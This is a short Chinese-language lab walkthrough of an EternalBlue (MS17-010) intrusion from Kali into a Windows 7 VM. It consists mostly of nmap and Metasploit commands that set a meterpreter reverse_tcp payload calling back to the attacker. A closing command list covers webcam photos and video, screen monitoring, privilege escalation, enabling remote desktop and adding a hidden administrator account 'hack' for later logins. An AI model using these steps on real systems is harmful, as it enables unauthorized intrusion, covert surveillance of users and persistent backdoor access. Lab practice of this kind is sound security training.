### 永恒之蓝入侵

攻击机：kali

靶机：win7



打开靶机打开命令窗口查看靶机IP

```
win+R	输入cmd打开命令窗口
ipconfig	查看靶机IP
```

![](https://www.helloimg.com/images/2021/10/13/CzIBRz.png)



打开攻击机终端查看攻击机IP

```
打开终端输入
ifconfig		查看攻击机IP
```

![](https://www.helloimg.com/images/2021/10/13/CzIoJm.png)



使用kali扫描靶机端口发现有个445端口

```
nmap -p- 172.16.1.101
```

![](https://www.helloimg.com/images/2021/10/13/CzIRu0.png)



在kali终端输入msfconsole

```
msfconsole
```

![](https://www.helloimg.com/images/2021/10/13/CzICLA.png)



使用ms17模块

```
use exploit/windows/smb/ms17_010_eternalblue
```

![](https://www.helloimg.com/images/2021/10/13/CzDuln.png)



添加攻击负载

```
set payload windows/x64/meterpreter/reverse_tcp
```

![](https://www.helloimg.com/images/2021/10/13/CzIFOh.png)



查看需要配置项内容

```
show options
```

![](https://www.helloimg.com/images/2021/10/13/CzIGQ5.png)



设置攻击机IP和靶机IP

```
set rhosts 172.16.1.101	设置靶机IP
set lhost 172.16.1.102	设置攻击机IP
```

![](https://www.helloimg.com/images/2021/10/13/CzIPrc.png)



执行

```
run
```

![](https://www.helloimg.com/images/2021/10/13/CzI13q.png)

一些命令

```
sysinfo		显示远程主机系统信息
getuid		查看用户身份
screenshot	对远程主机当前屏幕进行截图
run post/windows/manage/enable_rdp		开启远程桌面服务
getsystem		提权
webcam_list		查看摄像头
webcam_snap		拍照
webcam_stream	开视频
screenshare		桌面监控

shell		获得shell控制台
chcp 65001	编码
net user hack 123456 /add		创建一个hack用户，密码为123456 以便下次登录
net localgroup administrators hack /add		将hack添加本地管理员组中，获得最大权限
net user	查看本地用户
net localgroup administrators	查看本地管理员
```
